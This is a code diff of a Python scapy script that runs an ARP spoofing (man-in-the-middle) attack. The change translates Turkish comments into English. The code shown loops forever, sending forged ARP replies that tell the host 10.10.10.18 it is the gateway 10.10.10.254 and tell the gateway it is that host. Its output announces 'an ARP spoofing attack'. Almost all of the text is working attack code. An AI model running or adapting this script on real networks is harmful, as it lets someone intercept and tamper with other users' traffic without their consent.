@@ -49,16 +49,16 @@ def arp_poisoning(target_ip, poisoned_ip):
         packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
         scapy.sendp(packet, verbose=False)
     else:
-        pass  # MAC bulunamadıysa paketi gönderme
+        pass 
 
 
 packet_number = 0
 try:
     print("[*] Initiating an ARP spoofing attack (CTRL+C to exit)...")
     while True:
-        # Windows'u kandır (Ben modemim)
+        # Trick Windows (I am the modem)
         arp_poisoning("10.10.10.18", "10.10.10.254")
-        # Modemi kandır (Ben Windows'um)
+        # Trick the modem (I'm Windows)
         arp_poisoning("10.10.10.254", "10.10.10.18")
 
         packet_number += 2
